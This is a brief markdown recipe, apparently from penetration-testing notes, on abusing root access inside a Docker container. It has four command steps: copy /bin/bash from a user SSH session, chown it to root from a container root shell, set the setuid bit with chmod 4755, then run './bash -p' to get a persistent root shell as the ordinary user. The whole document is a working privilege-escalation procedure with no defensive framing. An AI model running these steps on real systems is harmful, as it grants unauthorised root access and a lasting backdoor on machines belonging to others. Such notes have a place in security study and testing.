# Abusing root privileges in a docker container

### STEPS

#### 1) 

    cp /bin/bash . (In a user ssh session) (That requires the ssh running internally of the container)

#### 2) 

    chown  root:root bash (In docker root shell)

#### 3) 

    chmod 4755 bash

#### 4) SSH back in, then execute bash for root 

    ./bash -p (user ssh session)
